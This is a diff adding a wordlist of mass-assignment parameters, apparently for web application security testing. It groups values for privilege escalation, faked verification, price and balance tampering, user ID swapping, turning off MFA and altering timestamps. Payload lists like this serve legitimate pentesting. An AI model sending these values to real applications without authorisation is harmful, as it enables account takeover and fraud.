@@ -1,0 +1,74 @@
+# ============================================================
+# Mass Assignment — Common Privilege/State Parameters
+# ============================================================
+
+# ---- Role / Privilege Escalation ----
+role=admin
+role=administrator
+role=superuser
+role=root
+role=moderator
+role=staff
+role=support
+role=manager
+isAdmin=true
+is_admin=true
+is_admin=1
+admin=true
+admin=1
+isAdministrator=true
+privilege=admin
+permissions=admin
+access_level=10
+level=10
+user_type=admin
+account_type=premium
+account_type=admin
+plan=enterprise
+tier=unlimited
+
+# ---- Account Verification ----
+verified=true
+email_verified=true
+is_verified=1
+confirmed=true
+active=true
+enabled=true
+locked=false
+banned=false
+suspended=false
+
+# ---- Financial Manipulation ----
+price=0
+price=0.00
+price=0.01
+discount=100
+discount=1.0
+total=0
+amount=0
+credits=99999
+balance=99999
+wallet=99999
+free=true
+coupon=100OFF
+
+# ---- User ID Manipulation ----
+user_id=1
+userId=1
+id=1
+uid=1
+account_id=1
+owner_id=1
+
+# ---- Security Controls ----
+mfa_enabled=false
+twofa=false
+two_factor=false
+otp_required=false
+require_otp=0
+
+# ---- Metadata Injection ----
+created_at=2020-01-01
+updated_at=2020-01-01
+deleted_at=null
+expires_at=2099-12-31
